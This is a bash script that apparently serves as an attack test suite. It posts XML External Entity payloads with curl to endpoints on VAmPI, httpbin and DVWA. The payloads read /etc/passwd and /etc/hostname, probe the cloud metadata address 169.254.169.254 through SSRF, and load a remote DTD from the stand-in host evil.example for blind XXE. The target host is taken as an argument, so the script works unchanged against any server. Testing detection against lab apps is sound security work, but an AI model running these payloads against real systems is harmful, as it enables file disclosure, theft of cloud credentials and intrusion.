#!/bin/bash
# XML External Entity (XXE) injection payloads
# Tools: curl
# Targets: VAmPI, httpbin, DVWA — endpoints that may accept XML
# Estimated duration: 1-2 minutes
set -uo pipefail

TARGET="${1:?Usage: 07-xxe.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] XXE injection suite against ${TARGET}"
echo ""

# --- Helper to send an XXE payload ---
send_xxe() {
  local url="$1"
  local content_type="$2"
  local payload="$3"
  local label="$4"

  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${url}" \
    -H "Content-Type: ${content_type}" \
    -d "${payload}" \
    --max-time 10) || code="ERR"
  echo "    ${label} -> HTTP ${code}"
}

# --- Payload 1: Classic /etc/passwd exfiltration ---
XXE_PASSWD='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>test</password><email>xxe@example.com</email></user>'

echo "[+] Payload 1: Classic XXE — file:///etc/passwd"
send_xxe "${BASE}/vampi/users/v1/register" "application/xml" "$XXE_PASSWD" "vampi/register (application/xml)"
send_xxe "${BASE}/httpbin/post" "application/xml" "$XXE_PASSWD" "httpbin/post (application/xml)"
send_xxe "${BASE}/httpbin/post" "text/xml" "$XXE_PASSWD" "httpbin/post (text/xml)"

echo ""

# --- Payload 2: Cloud metadata SSRF via XXE ---
XXE_METADATA='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data><value>&xxe;</value></data>'

echo "[+] Payload 2: Cloud metadata SSRF via XXE"
send_xxe "${BASE}/vampi/users/v1/register" "application/xml" "$XXE_METADATA" "vampi/register (metadata SSRF)"
send_xxe "${BASE}/httpbin/post" "application/xml" "$XXE_METADATA" "httpbin/post (metadata SSRF)"

echo ""

# --- Payload 3: XXE via parameter entity (blind) ---
XXE_BLIND='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/xxe.dtd">%xxe;]><data><value>test</value></data>'

echo "[+] Payload 3: Blind XXE via parameter entity"
send_xxe "${BASE}/vampi/users/v1/register" "application/xml" "$XXE_BLIND" "vampi/register (blind XXE)"
send_xxe "${BASE}/httpbin/post" "text/xml" "$XXE_BLIND" "httpbin/post (blind XXE)"

echo ""

# --- Payload 4: XXE with SOAP content type ---
XXE_SOAP='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>'

echo "[+] Payload 4: XXE via SOAP envelope"
send_xxe "${BASE}/httpbin/post" "application/soap+xml" "$XXE_SOAP" "httpbin/post (soap+xml)"

echo ""

# --- Payload 5: XXE targeting DVWA ---
XXE_DVWA='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><login><username>&xxe;</username><password>password</password></login>'

echo "[+] Payload 5: XXE against DVWA"
send_xxe "${BASE}/dvwa/" "application/xml" "$XXE_DVWA" "dvwa/ (application/xml)"
send_xxe "${BASE}/dvwa/" "text/xml" "$XXE_DVWA" "dvwa/ (text/xml)"

echo ""
echo "[*] XXE injection suite complete (10 payloads sent)"
